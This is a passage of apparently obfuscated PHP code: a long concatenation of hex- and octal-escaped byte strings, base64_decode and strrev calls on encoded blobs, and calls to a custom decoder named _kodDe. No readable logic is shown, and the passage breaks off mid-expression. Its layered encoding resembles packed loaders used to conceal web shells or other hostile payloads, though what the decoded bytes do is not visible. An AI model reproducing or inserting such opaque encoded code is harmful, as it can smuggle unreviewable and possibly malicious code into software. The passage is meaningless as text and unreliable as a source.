xca\x9b\xde\xbc\xfd\xe1\x1f\x16\xbe\xbc\xff\x77\xe\x1f\xdd\xbe\xf0\xf5\x5b\xff\x32\xf5\xe9\x9f\x7f\xe7\xd1\xf8".base64_decode('cTu8L56y99Zn3xw468WvVb5wW8/h7Xe89PQDUw68oHDFt/9r+2UzD1v/g5Y160MX/7PvoQ==').base64_decode('zvHTT712/ROXjTzdf/y7/xi6467O3Opw7JXgxQ13/XXq5obVyT9FjRuDqcCKP3uOLF74Sg==').base64_decode('y7bnf3zU0V/7YF37mT+e/fQhyx7b/9ga44+e/8zKXvts9kd/CD37/I4dwVtP9WzbHstOqQ==').strrev('ÚºﬂΩ–ˇz¸æ€m«K·vzè/ãå˚Sh∑ﬂk˜}˝yôÆœÂfu<¥GK¬rŸ´å˝9')."\262\23\146\65\37\221\71\370\310\137\126\56\273\252\146\375\321\211\3\17\135\273\176\343\71\317\177\375\302\125\203\327\35\373\356\105\372\341\327\316\371\225\176\370\206\13\17\370\332\255\347\34".base64_decode('0Tj1nBfn/fC5Jb13aD/68RFG7aIXr//Gq9Z+B/ym9RdXfuPWpesnDpq/4Y3ncusPvHHoKw==').base64_decode('Zx63e3PtliN+vP8vth5w4/wzNzy86KWz9DPe/dFTz3772H+t+uZFNz5r35u86scv/O0Xjw==')."\x9d\x60\xd\x1e\x3f\x25\x5e\xbf\xe4\xc2\xc7\xaf\x39\xea\x97\xb\xae\x7f\xe0\xa0\xaa\x9f\x26\x5f\xfd\xd2\x9\xf\x9e\x53\xe9\xfb\xc5\xc3\x6b\xfb\xd7\x1c\x91\xa\xe\x5f\xf4\xc2\x9d\xc7\x77\xc5\xe\x3a\x3a\xf1".base64_decode('yOMVm/7h+/bhD9x31QNPbzum6qYfXNwd+OY3jSMXalVntP3l+Bur/5Wu1e7LN2gVofirVQ==')."\47\167\255\72\361\325\135\363\277\167\365\236\67\266\275\125\63\177\217\161\175\172\372\202\374\53\65\307\56\317\176\177\137\325\246\327\236\376\155\355\167\347\155\231\377\245\247\236\372\370\210\123"."\xd7\x1d\xf7\xcd\xaf\x7c\x74\x5d\x40\xe9\xf9\xd1\x7\xca\xd7\x8f\xbf\xff\xde\xa7\x13\x7\xbe\x7e\xd6\xd6\x3\xe\xad\x3f\xbf\xf0\xd7\xe3\x6a\x27\xce\xcf\x1f\xd1\x3e\x23\x78\xec\x15\x96\xb2\xee\xf0\x3d\x7b\xbf".base64_decode('/JUTj5vfkvlF/OzetR9t+OoNj1x57FWPPrxLP+yMVRfG/nL8B01/6FJOqr7onyum3vuHIw==').base64_decode('1a1fW9Bof/+CqWf3XnxL/9Lucw89clfnt+tWfe2hXMWZe/cq9sias3s+mbjvqUv/cHHjkg==')."\xcc\xe0\x9f\xf\xdc\x1c\xd8\x76\xcb\x25\xbd\xcd\xe1\x79\x81\xb3\xbf\x6d\x27\x16\xfe\xe1\xd1\x33\x77\x7c\xbd\x6b\xfc\xd4\x1b\x7e\x78\xd7\x13\xff\x3e\x7e\xf0\x3b\x53\x17\xdd\xd1\xfa\xdb\x86\xb6\xdf\x26\x77\x5c"."\26\377\340\370\127\16\73\352\300\332\13\267\65\256\255\111\254\175\170\126\347\263\253\326\376\344\356\57\377\353\356\307\237\331\176\335\322\346\147\166\174\311\272\357\376\227\347\75\375\370\157\323"."\x6f\xae\x18\xb8\x73\xde\x5b\xf7\xde\x7d\x63\xb1\x6b\xe7\x67\x6b\x7f\xde\xf8\xf0\xf1\xdd\xf1\x5f\x35\x3d\xfb\x8d\x1f\xb5\xde\x52\xab\xee\x57\xfc\xeb\xa5\x8f\xf9\xf\xbe\x3d\x36\x75\xea\xc0\xae\x93\x77\x9e\x76"."\xca\x81\xd3\xde\x7a\xed\xd2\x83\x7e\xf7\x3b\xeb\xcc\xef\x2d\x8f\x7c\x6d\x68\x5e\xee\xde\xad\xab\xfe\xb9\xa9\xe3\xd4\x91\x19\x97\xbc\xfe\xb7\xe3\xab\x2e\x7f\x63\x64\xba\xf6\xf6\xbc\xe7\x7e\xfb\xdd\xe7\xae\xba"."\355\245\144\353\35\147\327\336\377\3\273\267\373\345\357\336\162\125\335\307\217\155\120\237\353\237\376\366\246\151\107\56\371\316\321\177\312\176\360\356\376\27\357\174\176\366\55\301\277\77\174\353".base64_decode('Bz13/P2kgz96xbP/7f853jM4rWvF0ENrbhrbc8r1e49uvmTLIXNPrVt0YOLEzWceUPfWsQ==').base64_decode('N3d+82fnf+vbvhc3nLHqva3zFt7adsWcB1ccNcd479hHArc8P/uuwq+i4+/vWda54Obimg==')."\233\375\123\236\336\330\364\322\75\277\177\347\236\273\162\73\117\175\363\331\373\33\67\236\220\357\271\142\312\261\7\354\131\164\310\61\73\157\217\57\232\267\143\366\45\27\276\232\154\233\172\344"."\xcd\x15\xc7\x6a\x5f\xb9\x6e\x5d\xcd\xc6\x83\x7\xcd\x2f\xbf\xf9\xd2\x6f\x3f\xbd\xf2\xb4\xbc\x92\x58\x39\xba\x76\xcd\x53\xfb\x77\xbe\x9f\x9a\x77\xee\x91\x87\x7c\x75\xea\xe3\x13\x31\xcf\x67\x3d\x83\xdf\x5b\x7e".base64_decode('yfDOJX9tGB4N/v5Q/ynvtWw0zyke8kqu8cw5Ww/63W/u2PzeV998NrvooeHf17w/sOnV9w==')."\176\367\370\316\33\273\6\237\334\360\243\307\237\354\330\163\326\321\75\237\116\74\377\310\265\353\107\77\374\333\73\313\167\137\173\352\147\37\276\61\367\51\265\173\317\17\376\375\366\37\337\364".strrev(' ehNDN?SÔ}˙?ã©Ú^ﬂÌ}˛O‚÷˘ﬁO—˘ıl˛,O-¯ﬁıΩüµ‘ußßÊˆ~•?')."\233\215\217\347\27\335\274\351\341\326\276\203\246\374\275\101\17\134\162\374\252\25\177\336\177\355\201\367\77\173\136\375\176\217\126\235\361\122\314\156\235\175\367\313\57\274\365\123\357\261\275\275"."\xd7\xfe\x3c\x91\xdc\x35\x75\x5b\x8b\xf5\xdd\x6d\x1b\xf\x99\x76\xce\xb\xfb\x9d\x75\xd6\xed\x6b\x77\x5c\xfa\x93\xe\xfb\xa9\x3b\x1f\xbd\xa0\xee\x1d\xcf\xce\x85\xa7\xde\xb7\xe7\xa7\x97\x15\x2a\xde\x9a\x38\x64"."\340\202\313\227\155\375\170\350\315\75\253\37\253\213\376\156\74\364\376\361\352\261\217\337\372\172\325\143\117\56\377\345\274\175\325\217\376\327\356\246\233\13\33\77\150\271\375\313\147\107\246\234".base64_decode('dM1jB3rrjlm5acW/tv/ximO+snTzGdcdeMbVB/3lmKOmPXnsXVNWLtvz0t/TkTWn7dUafw==')."\x3f\xf6\xf3\xe7\xde\xf9\xf4\xe8\x3\xea\xeb\x97\xd4\xff\x6d\x7b\xd5\x57\xf\xda\x74\xc9\x5b\x3f\x7b\x6b\xee\xf6\x4f\xee\xfd\xe3\x71\xff\xfa\xe7\x35\x9b\xf\xdb\xf8\x6e\xea\x5b\x2f\xf4\xaa\xda\x94\xbe\xdf\xdc"."\xfc\xe4\x27\xfb\xce\x88\x2c\xb7\xf6\xa4\xaf\x8b\x1e\x5a\x78\xa8\x7b\xcd\x8a\x3f\xd\x2f\x39\x66\x5e\xc3\x82\xb7\xbf\x7a\xf5\xc9\x7d\x57\xbe\xbc\xfa\xad\x6b\xb2\xdf\x39\x6e\xdd\x83\xcf\x9b\x77\x4f\xbf\x7a\xec"."\xfc\x3f\x3c\xa3\x9d\xff\xbd\x97\xd5\xdf\xce\x7b\xed\x31\xfb\x85\x17\x77\x7d\x38\x7b\xf7\xb2\xdd\x15\xdb\x8e\xd9\xbd\xf7\x85\x17\xaf\x7e\x75\xe8\x4f\x3f\x7c\xf1\x1b\xf\xf5\xbd\x3f\xf1\xf8\x7b\xb1\x9b\x4e\x39"."\352\221\153\142\132\142\353\243\147\335\36\326\52\177\165\304\105\15\326\77\317\270\153\311\245\37\156\271\342\326\237\177\362\330\327\267\6\267\335\160\322\212\335\357\154\337\20\177\345\330\137\175".base64_decode('tOOnL+z6ls/z0JS/3Tjv7Z7PvnXxGYdd9O4jxV9Nf+jORx/+yYbE4/vdfvhHc07414aznw==')."\xbb\x63\xc5\x2d\x4f\x7d\xf7\xdb\x1b\xa3\xa7\x1d\x38\xaf\xa1\x75\xe8\xef\x7\x6c\xbb\x79\xfb\x1b\x9f\x9c\x9e\xbd\x7b\xcd\x7e\x53\x4f\x7f\xed\x27\x13\x4b\xbb\xbf\xf7\x6b\xfd\xeb\x57\x3c\x3c\xa3\x72\x3f\x73\xbf".base64_decode('t256a+tXjnntxDfnvHbMI28/vL/3ikdvfSa5+ztBz3efuaN67Ttn37DwIX3lyXXHbeny3Q==')."\xfe\xe2\x7d\xef\xb6\x7d\xb6\x7c\x4a\xdb\x92\x8f\xab\x97\xde\xf9\xe1\x6a\xef\x15\x67\x1d\x13\xfc\xe5\xe6\x8a\xeb\x6b\xf3\x7f\x7c\x6d\xfd\x3f\xae\xf8\xfa\x4f\x6e\x2f\x6e\x8c\x1f\x56\xdb\xfc\x8c\x91\xfe\x65\x22"."\335\270\277\61\375\274\15\207\74\375\233\173\376\355\131\163\365\375\217\35\175\366\51\263\203\263\317\273\50\323\270\372\227\367\174\270\345\303\127\307\152\257\335\174\303\355\373\255\330\160\310\177"."\36\357\275\372\362\100\205\225\256\370\365\237\157\176\261\156\356\7\275\177\134\61\174\323\25\177\311\106\276\227\331\373\144\375\235\37\324\34\370\347\117\366\365\17\274\253\354\75\42\360\322\113"."\363\376\374\242\367\236\137\367\307\176\161\312\316\316\357\257\371\163\76\175\333\301\163\337\316\154\373\370\305\354\300\330\211\17\177\357\204\305\352\163\317\337\362\354\222\253\236\230\161\301\367\67".base64_decode('/3DOAWMvtzx+wN2zf7/wwMf2O+EZbav+yvvmkun/9VD2s+qJ2HPqZe/v6j7y/VOnr6ovXA==')."\276\157\303\202\37\376\147\337\353\235\267\177\353\214\215\237\234\173\326\273\127\336\37\375\364\343\237\336\161\375\320\177\335\61\347\262\252\213\357\231\72\347\226\103\117\134\172\364\207\177\270\251"."\251\352\226\307\307\337\137\177\352\302\177\275\367\352\307\327\366\254\373\307\233\357\37\366\120\375\177\136\176\347\311\305\377\375\311\173\67\364\35\265\376\277\77\236\353\137\64\177\375\107\241\25".strrev('cø‹O£¡˘ˇ?˚ˇÎµ˘}ø”~,˚÷uˇÎìÿr]Ô{·˚[ÔÎOÁ}OÍ}>á¢Õ}⁄ø')."\342\235\333\206\176\174\310\151\363\223\377\276\46\372\313\163\107\137\173\173\313\75\377\374\363\137\336\71\350\52\263\363\346\273\376\373\243\366\344\360\356\373\326\77\275\172\370\376\75\237\375\365"."\231\177\374\373\200\303\116\313\155\173\372\273\207\276\165\311\267\12\335\177\337\162\116\364\364\337\77\146\17\155\355\352\171\342\250\163\337\74\366\252\33\177\363\342\367\17\151\333\264\273\351\340"."\211\153\277\165\306\65\17\337\361\251\162\136\313\225\217\154\14\131\211\265\7\205\355\256\107\37\375\131\40\135\367\225\306\271\273\236\73\361\320\137\277\274\337\203\125\267\276\361\336\167\330\153"."\273\202\235\52\216\30\300\206\347\212\205\325\231\176\220\203\301\103\241\364\100\166\110\117\201\60\0\24\331\372\162\303\243\305\261\325\64\62\253\26\40\107\372\320\371\233\111\32\206\262\172\161"."\xb8\xf\x40\x66\xcf\x7\x55\xa8\x79\xf3\x80\xfd\x9a\x35\x13\xa\xe5\x7\x8d\x31\xcb\x84\x4f\x82\x74\x2e\x39\x94\x36\x7b\x47\xe1\x20\x39\x87\xa9\x51\x8d\x5a\xda\x58\x6a\x10\x6e\x9d\x67\xd7\x1\x6c\x61\x20\xbf"."\xba\x97\x9\x55\x4d\xdd\x1a\x1c\x4b\xc1\xd5\x66\x7e\x6c\xc0\xb0\x34\x10\xb2\x16\xf2\x99\x9c\xc5\x5e\xf\x8e\xa5\xa\xbd\xd9\x34\x48\xec\xe6\xd4\xcc\x5\x2e\x31\x37\x86\xd8\x7c\xb8\x68\x33\x93\x23\x5\x23\x7".base64_decode('kbr5cOM8fz4MQE43xgZHoO6Zc0EfddZsyK6dzZR/xnLFoVHg7WfOguy5NbPZWTttDY0A5w==').base64_decode('O2c+pNbNhBYND60uaCZw86P5tDm2Gjo6B4Zx0MqPpXKgXJ0bGTYL7AXH4HDvQKaPnaGM1Q==')."\146\241\17\162\346\316\206\336\314\236\11\201\241\336\341\202\311\64\175\63\205\144\336\312\102\317\107\315\276\376\54\353\347\154\246\307\70\173\26\164\170\176\55\314\215\75\230\316\132\253\1\256".base64_decode('rhbqrZ01H/BFyxjman7tnx4c0MYAIWqhJ3OhpgHbyCczgG518J1k3u5FaAqRXnMoMwKTnA==').base64_decode('zKaGRy12M5FLDw0yXMoO9+Uz/QyJ6qBJM6FFY7Y+MDwKCgq9Y9kkH8UiOihrvZCTNYZW5w==')."\170\45\263\240\222\374\250\241\45\231\70\142\116\55\233\325\71\154\35\14\364\215\15\346\331\63\256\261\134\306\354\205\32\146\315\143\43\76\250\215\132\151\30\203\272\171\363\331\160\316\145\210".base64_decode('BIG5c6Hy+awDtWwpzZkDgXRvMqVrBltgUCA50p8eyDA5bl9vyhwFQeWs+aydZnJwNdcPXg==')."\235\112\16\345\362\14\317\231\234\274\57\65\226\263\7\30\332\302\134\365\17\16\344\262\354\372\42\157\233\326\320\30\14\336\310\150\177\161\150\65\364\53\153\353\103\43\26\344\130\253\365\201".base64_decode('lNbLEAhqGk6ODWXZCXf+PPjqnLnQwsJYVsswOc1sSJzHGmeOjaT6mZKJmbOGMgxFELYbow==')."\114\243\51\71\150\216\350\32\120\242\301\264\321\147\145\140\111\315\147\303\334\153\233\106\226\211\317\346\314\203\201\55\24\215\314\120\32\72\77\222\113\255\316\367\247\31\26\315\143\204\160\160"."\304\110\367\63\232\306\60\2\2\163\331\2\233\67\23\20\171\56\133\60\375\346\120\57\102\43\150\273\66\222\356\145\372\303\271\354\330\140\41\303\64\17\265\344\0\23\16\163\15\143\131\65"."\227\152\163\121\51\234\174\233\302\236\153\32\71\137\126\313\161\115\232\126\370\242\234\66\240\353\114\311\37\246\307\26\332\31\240\25\14\351\106\126\27\2\157\172\255\300\112\212\23\74\26\237".base64_decode('SPodOBqXa0nmbCkbxRy5cfkdAvQOt9An93pllpGiMteTIOS1LEQNYcQGzFQyYxZTjlpTvQ==')."\xbe\x32\x23\x49\x7b\x52\x2e\x27\xed\x4e\xe7\x5a\x40\xa2\x42\x87\xbe\x3d\x4b\x73\x8c\x5a\x2f\x99\x51\xae\x72\x84\xff\x40\xbb\xe9\xc3\x63\xb\x6b\x8e\xf3\x77\x72\x14\xda\xc7\x26\xa6\x57\x42\x7\x2a\xaf\xb7\x35".base64_decode('a8AnJ3vlXCOH2pvJ+JxP0fGb8M4ONRGIL5FU+fCbZYY7qlCJlfohJk0aQXnunH1muLFv9w==')."\x3\xe3\x17\x6c\x9d\xb8\xec\xd6\x89\x2d\xbb\xc6\xef\xbf\x64\xdf\xae\x5b\xc7\xf7\x5c\x86\xa2\xaf\xdf\x7b\xfe\xf8\xae\x6b\xde\xb8\x62\xd3\xeb\xf7\x6e\x79\xfd\xde\xd\xfb\xce\xba\xf3\x9d\x7\xcf\x1b\xbf\x60\xf7"."\276\323\367\214\157\337\61\376\243\263\136\177\140\317\276\207\316\332\273\143\363\353\367\356\234\330\176\316\370\246\273\137\177\140\353\370\331\327\215\237\165\301\304\45\133\136\337\263\35\301\117\234".base64_decode('LWpGYOM7t+GyD24cv/fefdfv4LnvPHga0H1Yqy26rcSXRph+FkFIZZECqKhbPqUjo6MRUw==')."\x88\xfa\x2e\x56\xe6\xb2\xfb\xf5\x82\x62\x13\xa5\x2e\xd\xfd\xcb\x99\x39\x2f\x45\x35\xfa\x8c\xde\x52\x8c\x1c\xce\x56\xd8\x58\xfb\x38\x3a\x26\xf4\x6c\x1e\x23\x15\x8c\x92\x9f\xbe\xa7\x75\xbc\xda\x90\x30\xaf\xdc".base64_decode('MNOMMniEx1rMVRUOwi0dlgUqaQ0lpOqVNCqmsFdjim2ycHaUT7oL/ctOK28Gm9o+LpIXkg==')."\142\150\230\364\34\207\136\303\224\240\24\131\117\116\142\340\130\151\116\62\42\147\71\107\2\104\271\104\243\300\243\320\246\170\24\162\217\254\70\37\217\143\15\1\266\155\311\153\106\156\176\101"."\317\147\370\205\22\226\206\226\35\104\127\27\342\145\206\213\167\302\221\211\326\143\321\56\3\50\217\252\54\42\66\314\140\6\221\62\161\301\111\356\362\105\163\151\124\210\246\321\207\70\45\54"."\xe8\x29\x83\x69\x19\xeb\x59\x2\x9\x14\xd0\x27\x5d\xc\xd1\x17\x56\x5c\xd5\x39\x89\xd0\xbe\xe0\xb8\xf3\x5a\xb8\x38\xdf\x9f\xc7\x96\x38\xec\x5\x8b\xe1\x29\x0\x7b\x6a\x27\xb5\x1\xc2\xe2\xc5\x98\x9c\x2a\xb4"."\xee\x69\x3c\xe3\xbe\x57\xe3\x8b\xa6\xa9\x51\xb2\x8f\x81\xc1\xea\xbd\x5e\xaf\x24\xff\x15\xa\x68\x38\x4\xd5\x8b\xeb\x65\x94\x16\xc2\x2b\x7a\xb2\xf4\x26\xae\x75\x81\x96\x7a\x5f\x9f\x6e\xd9\xf5\xe4\x21\xae\x32".base64_decode('Q0ENn+erRQGyKGb75qIgGUFYyN0wqkWLPYua5pvFmJsFoDKygNCTBqn5kC5KFXMZloqCCA==')."\44\126\314\341\331\257\167\366\131\317\245\244\102\13\264\244\55\325\252\246\141\220\175\142\74\264\31\42\137\117\301\363\102\277\64\112\303\0\300\312\266\71\161\2\365\337\313\321\4\115\267\215"."\x5a\x60\x11\xc5\x55\xd8\x45\xa0\x4a\x4b\xb2\x5b\x10\x13\x18\x86\x8b\x93\xe1\xfa\x9c\xa2\xb6\x3c\xe5\xf9\xa4\x99\xcb\x71\x8d\x55\x2b\xa3\xb1\xfb\x49\xb\x3f\xf0\xc9\xe9\x1c\x1f\x8b\x96\xac\xbb\xaf\x8b\x25\x8d"."\165\275\125\264\257\133\2\223\325\224\1\240\221\160\243\332\24\216\211\162\152\276\350\176\327\41\133\224\11\164\204\325\170\74\52\275\362\40\17\244\127\250\113\242\115\152\60\32\135\22\6\244".strrev('{ÒTEÄ≠_æŸ˘}qàÿ?∞âø†+éxì`ñÃö^≤;WƒœºLq©Æ)ó~\'hó®iÑ')."\201\6\146\103\40\236\10\304\312\30\176\241\6\141\140\212\300\10\14\24\150\215\56\127\202\321\110\147\133\173\234\332\73\241\351\355\121\51\237\150\105\103\66\63\13\123\232\15\325\207\72\42"."\x81\x60\x48\x9\xb7\x27\xa2\xec\xbd\x3\x57\x4f\x25\xf\x70\xe2\x3c\xce\x86\xa0\x60\xe9\xdc\xec\xb\x94\xa7\x11\xf9\x91\x90\x5c\x23\xaf\x9\x90\xba\xcb\x53\xd9\x5d\xd1\x3d\xbd\xbb\xaa\xbb\x7a\x95\xaf\xdb\xea"."\361\113\273\231\41\117\17\104\72\232\240\173\365\74\224\142\147\306\266\70\142\3\150\60\32\13\4\43\254\51\215\201\70\4\243\301\60\15\354\275\364\266\327\357\77\177\357\125\273\306\317\331".base64_decode('giqauHLjxOV3I+YFMyy7ztv7s/MnLt09cR4wGsq+3fe8vuehvZfuGN+1bWLrfXuvPINmvA==').strrev('ﬂœ{ä¸~Ωœ∆[ÌâÊ◊q0ÿnafgªŸm67ÈPxª ô»ﬂÁg‰∏ﬁS'."\r".'‡ÓÁ„m”q')."\75\376\303\323\307\317\334\262\157\367\145\47\270\21\211\306\273\330\124\300\323\160\377\251\370\131\77\35\336\156\153\6\36\332\152\364\133\205\137\121\240\137\246\14\116\324\204\227\166\206\332\203"."\41\367\163\44\71\12\66\163\246\123\14\241\52\63\300\265\132\140\163\207\305\211\175\215\206\312\111\133\261\26\346\137\152\224\324\230\246\120\74\30\13\67\206\100\117\237\117\324\64\302\161\201"."\xc2\x4\x4a\x8d\xc7\x96\xf1\x30\x7f\x56\x5b\x62\xe3\x48\xa9\x62\xc8\x5c\xad\x38\x3a\xa2\xf9\x92\x66\xa6\x98\xcd\x91\xc6\x2a\x15\x58\x7f\xab\xc2\x83\x77\x24\xf2\x36\x4a\xa9\xc0\xbb\x2d\x4a\xd0\xb1\x31\x80\x2a"._kodDe('KfJhXXlL8KGjyelfbQqgdSVAOc51mhiJ9267vC4xPIOyok2bnJ5PBL01Sbmwl62gy8cJKUc=').strrev('76}&[(í£©jHNMÌSN·\'ù¢}%L:˝^$Ùíõ»Åö≤Ã‘EÄÆnX4O')."\243\302\246\271\262\132\351\205\327\17\145\62\111\61\307\140\64\70\6\243\152\6\320\211\216\26\76\337\364\151\203\102\237\274\321\146\151\26\233\50\110\45\123\205\123\351\154\61\130\23\165\3"."\115\16\205\107\1\236\203\37\1\360\232\20\71\342\31\154\6\161\72\237\304\62\171\304\64\125\5\345\12\151\77\263\126\37\43\165\360\344\277\155\45\357\3\303\145\205\261\46\334\260\25\176"."\274\27\112\4\133\51\226\307\45\64\117\365\116\163\40\252\30\116\305\201\42\374\150\1\160\164\271\140\202\160\20\201\13\267\67\107\143\155\364\321\132\74\330\32\152\13\370\200\210\123\114\240"."\360\230\357\122\32\224\112\114\371\150\122\245\143\370\311\207\330\220\45\310\127\321\272\122\155\304\104\321\121\310\367\101\143\140\366\25\142\273\100\43\105\32\52\251\171\31\250\222\133\140\213\306".base64_decode('EioaACDPEtWtlHYLSTMcP8EaYmeCNOKKTGYoJ9XLDLWhynGdwWh7c5i9z2uCE3Q+ZTqAmg==')."\x62\x61\x6c\x3d\x4\xbe\xaf\xb0\xaa\xa4\x57\x91\x28\x22\xd4\x33\x50\x24\x3f\x9c\xe2\x61\x61\x90\x1\x67\xf0\x3d\x1f\x45\xc4\x96\x8f\x22\x7c\xb3\xc1\x50\x92\x45\x39\xfc\xfd\x78\x3b\xf\xb\xc6\x17\x45\x3a\xe3"."\354\221\6\246\276\313\233\170\270\225\277\235\307\31\321\230\24\11\304\2\155\161\36\215\55\347\217\76\170\32\175\374\241\266\167\266\11\212\37\11\54\103\310\22\25\14\12\243\326\125\276\351"."\x8b\xab\xbb\xe9\x4b\x3a\x1a\xa4\x3f\x27\xb1\x18\x7e\x5d\xd4\xb3\xa6\xd6\xa3\xcc\x59\x57\xd\x30\xdc\xa\x87\xdd\x6f\xe4\x18\xe7\x89\xbf\xb2\x34\xa2\x46\xa2\x2d\x34\x4e\x2c\xdd\x85\x72\x29\x71\x6e\x51\xba\x14"."\304\6\47\4\33\154\261\255\213\257\6\5\341\260\102\237\13\53\355\321\345\1\141\74\115\312\200\24\141\113\315\177\152\127\367\160\267\17\61\13\326\52\361\62\256\251\121\141\154\10\61\300"."\2\142\0\50\35\140\333\350\52\17\354\30\152\306\354\143\202\165\104\20\31\273\100\177\127\260\0\241\225\120\40\111\236\122\217\360\106\4\274\247\250\335\153\273\117\354\366\372\350\163\104\314"."\xbc\x74\x7b\x44\x93\xd4\xd0\xa\xb4\xc7\xc6\xe3\x8e\xb7\x94\x2a\x31\x2\x6\xb5\xa3\x5e\x42\x88\xae\x5a\x1a\x59\x8\x3f\x70\x32\x5b\x8\xec\x29\x44\x17\x35\xf0\xc9\xc\x2d\x5d\xdb\x8e\xfe\xb5\x24\xd6\x86\xd0".base64_decode('vwj6iSTQdBkcAC3JSHhJaC3+T2RU84Gkb4+cBcLta9H/iMCsDbe7K2sMJZaHQhSAheFXgA==').strrev('®ÅqJ!Ø®(<@êˆ∂µ9UR37‡\'V˝UZ£3€”EZ™’@-ê'."\0".'á‚!,ï]Ç"')."\xed\x3b\x11\x81\xdb\xf7\x83\x78\x4b\x2c\xda\xd9\x21\xc5\x5b\x3\xcb\xc2\xed\x2d\x2c\xe6\x9f\xce\x42\xd3\xa1\x6a\xa5\x29\x1c\x47\x43\x14\x64\xc8\x28\xcc\xe\xca\x71\x60\x38\x9\x5b\x24\x73\xbd\xe\x94\x6e\x42"._kodDe('KBOKGjsTjPwVWx6kbLyoZsQ/mi1094Q5V0oX7BNfimeiRCKGVP6paBQcDLzeWhhOAgR6gfY=')."\x91\xe1\x62\x11\x62\xde\x90\x45\x48\x47\x59\x4\x9f\x4e\x42\xed\x2c\xf\x9d\x18\xd1\x69\x8f\x1d\x3\xfb\xb5\x21\xfe\xfe\x71\x41\xaa\x57\xb2\x41\x82\x69\xb0\x8f\x4a\xce\xb0\x25\x1a\x74\x8a\xd3\xb8\x94\xd4\x25".base64_decode('7CRyKkkMQFX5FOn9NZaaSrIlP4VAzCeBQb/dqxYT5ngVw1P69NdOGHbG8VF4KIg+GibvMg==')."\xa5\xcf\xb2\x97\x14\x44\x48\xa8\x9a\x92\x88\x9a\xec\xdb\x72\x82\x10\x4b\x51\x79\x36\x48\x74\x85\xd4\x7\x6b\x34\x12\x59\x2f\x8d\x3a\x4f\x54\x9c\x4c\xad\xe2\x7\x25\x30\xe9\xe0\x81\x5f\x68\xd1\xd7\xe9\x4f\x37".strrev('ª±ûpƒ=é≤·¯˜7Ê∑2=‹–ú!¢˝ØÙ<ﬂÙ^55#›]Ï1õ∑MÅÈR>£DôD')."\273\53\46\33\144\0\140\103\15\321\12\32\145\245\14\276\163\46\373\261\151\34\325\316\62\351\71\71\342\11\261\65\25\240\213\170\123\54\332\101\371\30\45\334\254\120\73\21\112\45\25\271"."\x57\x2\x83\x16\x8c\x85\xf0\x1a\xa3\x50\x2c\xaf\xaa\xd2\x21\xf2\x5a\x54\xa9\xc0\x23\xed\x6a\x67\xa9\x70\x7b\x53\x68\x85\x52\x69\xa4\x46\x54\x4d\x53\xa1\xb0\x82\x56\x34\xab\x48\x29\xa9\x89\xd5\x40\xdb\xa\xd7"."\104\126\277\71\254\310\110\312\116\335\101\232\226\20\210\133\302\340\21\323\12\354\101\254\7\216\366\74\207\362\325\64\53\34\107\333\176\44\102\172\212\262\14\13\263\303\36\205\133\100\300\211"."\370\10\103\305\247\120\21\313\240\25\321\254\320\212\104\54\200\23\11\17\173\360\101\350\17\41\113\370\214\125\310\152\364\255\50\341\374\174\253\100\324\260\312\301\150\122\26\24\263\232\200\167"."\x64\xe3\x94\xfa\xc4\x73\x88\xbc\x81\xe\xb3\x2c\x8d\x58\x2\xbc\x3b\x8d\x75\xc4\xc2\x6d\x81\xd8\x4a\x18\x32\x71\x92\x80\x85\x6b\x66\x1c\x6f\x85\x45\xc4\xb0\x3a\xa5\xd7\xea\xed\xa8\xd5\xf2\xeb\x75\x3a\xc7\x9c"."\116\243\123\61\243\323\250\65\64\130\201\147\236\6\301\246\255\312\37\43\63\121\114\25\173\332\353\141\1\146\15\202\74\227\142\322\257\54\42\134\74\46\146\15\160\37\146\105\316\225\37\174".base64_decode('CaO7eKvFk8z2jOZAZ0ROgaFSloRWfs4aYS0tt0ZYHhPq8NUG/amaDf2jdiqq6tDJtog1Lw==')."\x72\xdc\xae\x27\xb4\xa\x76\xe8\xce\x44\x54\x45\xbb\x50\x2c\x84\xf7\x4\xe8\x11\x1f\x56\xa9\xbd\xd2\xe9\x5d\x9e\x14\xa8\x6\x3\x70\xb\xc6\x9f\xd3\x35\x6\x53\xae\x6b\xbc\x3c\x97\x5f\x85\xda\x5b\xc2\xed\xa1"."\x86\xb6\xd1\x70\x3c\xd0\xa6\xb0\x86\x83\x84\xe\x5b\xf3\x9c\x7\xf5\x84\xa3\x6a\x4\x71\xd6\xaa\x2c\x84\xb\x47\x41\x70\xec\x30\x15\xa9\xaa\xc2\xc8\x89\x4f\x13\xca\xe1\x76\xa1\x28\x19\xde\x33\x4c\xa2\x88\xdd"."\xc6\xdf\x6c\x10\xcd\x71\x84\x10\x1\x61\xe3\x80\xb\xb7\x49\x5e\xb1\x17\x97\x96\x37\x3d\x28\xef\xb2\xc8\x6a\x98\xf5\x38\x7\x3\x53\x5e\x67\x81\x0\x57\x1d\x1f\x77\x6b\x5e\xcb\xc9\x42\x29\x5c\xdc\x6\xb3\xb"."\x67\x6e\xb8\xf\xa\x74\x4a\x36\xa\x70\x61\x85\x7d\x90\xdc\xa\xe5\x9c\xcd\x43\xdb\x6c\x86\x19\xcf\x52\x75\xd1\x9b\xac\x6e\x59\xfc\x56\x38\xd1\xaf\x2b\x56\x5e\x4f\x12\x13\xa0\xa\x18\xae\x53\x52\xa6\x6e\x9".strrev('aMB'."\n".'∫-G3´π>VíIwâ…ﬁ/}¢^¶˝B=qŸÃ\\ÉdjmŒ€ Ê∞øvÇ≈¥‰ˆ0·õ').base64_decode('PjQSlEiMCGO5+CpE1NnDZAZiPMYMtgm6LxN5I3Nmh17IGuQ+aLm47oF9BlVA59+nuMrJow==')."\x8e\xef\x10\x4b\x20\xb1\xd5\x8a\xcf\x9b\x43\x66\x37\x8d\xb4\x4c\x7a\x24\x89\xa3\x80\x2b\xf8\x42\x54\x7a\x7a\x52\xcc\xa1\x8f\x78\xe5\xc7\x4c\x8\x77\x48\xa2\xf4\x7c\x82\x99\x4f\xa4\xb1\xb9\xa0\x63\x82\xf0\x13"."\2\175\220\302\176\13\54\307\47\254\334\220\72\61\127\345\25\126\47\122\232\374\156\124\262\72\177\202\214\51\144\312\5\156\247\15\331\4\205\117\330\33\346\313\345\44\76\121\370\75\65\334"."\xca\x63\x86\x3d\xad\x4a\x6d\xe9\xe0\xf0\xc2\xd2\x28\x1d\xd\x69\x1a\x48\x2\xd\x92\x5\xae\xd4\x8b\x46\xb4\x1a\x18\xff\x47\x25\xdc\x91\x52\xdb\x98\x45\x26\xb0\x76\x1c\x61\xba\x51\xf8\xfd\x87\x6e\x83\x35\x32"."\x7\x7d\xa\x47\xa1\xac\x4f\xc7\x8f\xa9\xe8\xd3\x96\x10\x37\x16\x89\xa\x52\x93\x7a\x5f\x5c\xa8\x53\x32\xf8\x3c\x9\x49\x29\x5b\x2e\x8\x80\xf